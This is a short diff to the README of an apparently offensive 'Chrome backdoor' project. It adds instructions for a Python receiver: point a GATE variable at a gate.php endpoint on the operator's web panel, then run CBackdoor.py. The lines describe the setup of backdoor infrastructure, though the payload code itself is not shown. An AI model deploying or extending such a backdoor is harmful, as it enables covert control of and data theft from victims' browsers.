@@ -47,3 +47,19 @@ Make it on webpanel
 Update lock page with 1
 
 ![Backdoor lock](http://s27.postimg.org/vahc0lb8z/lock.png)
+
+## Python receiver 
+
+Update  GATE var on Cbackdoor.py
+
+```Python
+GATE = "http://localhost:8888/chromebackdoor/web/gate.php?last=1"
+```
+
+Start 
+
+```Shell
+python CBackdoor.py
+```
+![Backdoor chrome python receiver](http://s12.postimg.org/ywkao1mv1/Capture_d_e_cran_2016_01_18_a_19_43_39.png)
+
